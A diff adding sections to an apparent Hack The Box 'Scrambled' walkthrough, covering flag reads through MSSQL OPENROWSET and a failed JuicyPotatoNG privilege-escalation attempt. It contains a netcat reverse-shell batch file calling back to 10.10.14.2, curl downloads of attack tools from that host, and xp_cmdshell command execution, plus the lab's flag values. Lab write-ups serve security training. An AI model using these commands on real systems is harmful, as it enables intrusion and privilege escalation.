@@ -37,6 +37,8 @@ Level: Medium
 	3. [`Reverse Engineering EXE and DLL ScrambleClient/ScrambleLib`](#`Reverse%20Engineering%20EXE%20and%20DLL%20ScrambleClient/ScrambleLib`)
 	4. [`Preparing Payload using Ysoserial.net`](#`Preparing%20Payload%20using%20Ysoserial.net`)
 	5. [`Sending Payload and Getting SYSTEM Shell`](#`Sending%20Payload%20and%20Getting%20SYSTEM%20Shell`)
+8.  [Unintended File Read via MSSQL](#Unintended%20File%20Read%20via%20MSSQL)
+9. 
 ### Box Info
 ```
 Scrambled is a medium Windows Active Directory machine. Enumerating the website hosted on the remote machine a potential attacker is able to deduce the credentials for the user `ksimpson`. On the website, it is also stated that NTLM authentication is disabled meaning that Kerberos authentication is to be used. Accessing the `Public` share with the credentials of `ksimpson`, a PDF file states that an attacker retrieved the credentials of an SQL database. This is a hint that there is an SQL service running on the remote machine. Enumerating the normal user accounts, it is found that the account `SqlSvc` has a `Service Principal Name` (SPN) associated with it. An attacker can use this information to perform an attack that is knows as `kerberoasting` and get the hash of `SqlSvc`. After cracking the hash and acquiring the credentials for the `SqlSvc` account an attacker can perform a `silver ticket` attack to forge a ticket and impersonate the user `Administrator` on the remote MSSQL service. Enumeration of the database reveals the credentials for user `MiscSvc`, which can be used to execute code on the remote machine using PowerShell remoting. System enumeration as the new user reveals a `.NET` application, which is listening on port `4411`. Reverse engineering the application reveals that it is using the insecure `Binary Formatter` class to transmit data, allowing the attacker to upload their own payload and get code execution as `nt authority\system`.
@@ -1093,3 +1095,120 @@ nt authority\system
 ```
 
 Get your root flag.
+
+### Unintended File Read via MSSQL
+
+There's an alternate way to read the root flag file. Without even taking shell as `MiscSvc` user. You don't even need to get a `MiscSvc` Shell. I got both the flag in one shot.
+```
+SQL (SCRM\administrator  dbo@master)> SELECT BulkColumn FROM OPENROWSET(BULK 'C:\users\miscsvc\desktop\user.txt', SINGLE_CLOB) MyFile
+BulkColumn                                
+---------------------------------------   
+b'e98c2b12617eaec7d3db569c8eb14b40\r\n'   
+
+SQL (SCRM\administrator  dbo@master)> SELECT BulkColumn FROM OPENROWSET(BULK 'C:\users\administrator\desktop\root.txt', SINGLE_CLOB) MyFile
+BulkColumn                                
+---------------------------------------   
+b'4bb5245ab97725fb599b126174390fa1\r\n'   
+```
+
+## RougePotato using MSSQL - Potato Exploit
+
+First let me show you the difference of privileges for the two users that we have access to. `sqlsvc` and `MiscSvc`.
+
+`Allowed Privilege to sqlsvc`
+```
+SQL (SCRM\administrator  dbo@master)> xp_cmdshell whoami /priv
+output                                                                             
+--------------------------------------------------------------------------------   
+PRIVILEGES INFORMATION                                                             
+----------------------                                                             
+Privilege Name                Description                               State      
+============================= ========================================= ========   
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
+SeMachineAccountPrivilege     Add workstations to domain                Disabled   
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
+SeCreateGlobalPrivilege       Create global objects                     Enabled    
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
+```
+
+`Allowed Privilege to MiscSvc`
+```
+PS C:\ProgramData> whoami
+scrm\miscsvc
+PS C:\ProgramData> whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                    State  
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+```
+
+okay so the Service user has more privileges allowed. Now We can certainly try to take advantage of the Potato Exploits. Let's try it out.
+
+`Revershell.bat`
+```
+# more revshell.bat                                             
+C:\\ProgramData\\nc64.exe -e cmd 10.10.14.2 5555
+```
+
+We got three things. 
+- JuicyPotatoNG.exe
+- nc64.exe
+- Revershell.bat
+Get all three things on the target using `sqlsvc` SQL Shell as follows.
+
+```
+PS C:\programdata> whoami
+scrm\sqlsvc
+PS C:\programdata> curl -o nc.exe http://10.10.14.2/nc64.exe
+PS C:\programdata> curl -o JuicyPotatoNG.exe http://10.10.14.2/JuicyPotatoNG.exe
+PS C:\programdata> curl -o revshell.bat http://10.10.14.2/revshell.bat
+PS C:\programdata> dir
+
+    Directory: C:\programdata
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d---s-       03/11/2021     16:50                Microsoft                                                             
+d-----       01/06/2022     12:43                Package Cache                                                         
+d-----       01/06/2022     14:38                regid.1991-06.com.microsoft                                           
+d-----       15/09/2018     08:19                SoftwareDistribution                                                  
+d-----       05/03/2020     23:43                ssh                                                                   
+d-----       26/01/2020     17:32                USOPrivate                                                            
+d-----       26/01/2020     17:32                USOShared                                                             
+d-----       31/10/2021     20:41                VMware                                                                
+-a----       07/09/2024     07:48         153600 JuicyPotatoNG.exe                                                     
+-a----       07/09/2024     07:48          45272 nc.exe                                                                
+-a----       07/09/2024     07:03          45272 nc64.exe                                                              
+-a----       07/09/2024     07:49             49 revshell.bat                                                          
+```
+
+At this point I ran following command from `SQL Shell` and the Stable Shell for user `sqlsvc`.
+```
+SQL (SCRM\administrator  dbo@master)> xp_cmdshell C:\\programdata\\JuicyPotatoNG.exe -t * -p C:\\programdata\\revshell.bat
+output                                                                             
+--------------------------------------------------------------------------------   
+
+         JuicyPotatoNG                                                                    
+
+         by decoder_it & splinter_code                                                    
+
+[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247    
+
+[-] The privileged process failed to communicate with our COM Server :( Try a different COM port in the -l flag.    
+```
+I did not get the reverse Shell. The Privileged Process Failed. I got the same results from Stable Shell
+```
+PS C:\programdata> .\JuicyPotatoNG.exe -t * -p C:\programdata\revshell.bat 
+
+
+         JuicyPotatoNG
+         by decoder_it & splinter_code
+
+[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247 
+[-] The privileged process failed to communicate with our COM Server :( Try a different COM port in the -l flag. 
+```
